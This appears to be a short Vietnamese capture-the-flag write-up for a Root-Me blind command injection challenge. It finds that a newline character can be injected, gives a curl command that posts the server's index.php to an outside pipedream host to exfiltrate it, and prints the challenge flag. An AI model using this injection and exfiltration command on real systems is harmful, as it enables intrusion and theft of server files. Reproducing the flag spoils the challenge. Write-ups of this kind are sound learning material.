![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/62ca2c38-ed7a-4ab9-801d-4c17f1ee2e5a)

Sử dụng Burp Intruder để xem kí tự ào có thể inject

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/335d21f5-860b-4431-b8a3-59d12b315629)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/f9d20150-1472-4e4a-92ed-628dabc033c3)

=> ```%0A```

Vì nó chỉ hiển thị Ping OK hoặc Syntax Error nên ta cần chuyển nội dung của tệp index.php sang một chỗ khác
ở đây dùng câu lệnh curl ```%0Acurl -X POST -F file=@index.php https://eoa5xfbpq29fucc.m.pipedream.net```.
Nhớ thay khoảng trắng bằng %20 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/863ac7e1-2665-450c-a0a6-43578ad1a85b)

Nếu có thể thì dùng Burp Colaborator Client thì tiện nhất, không thì có thể tạo trên RequestBin
Truy cập vào trang web vào xem thôi. Ta được flag

=> Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!

```https://eoa5xfbpq29fucc.m.pipedream.net/```
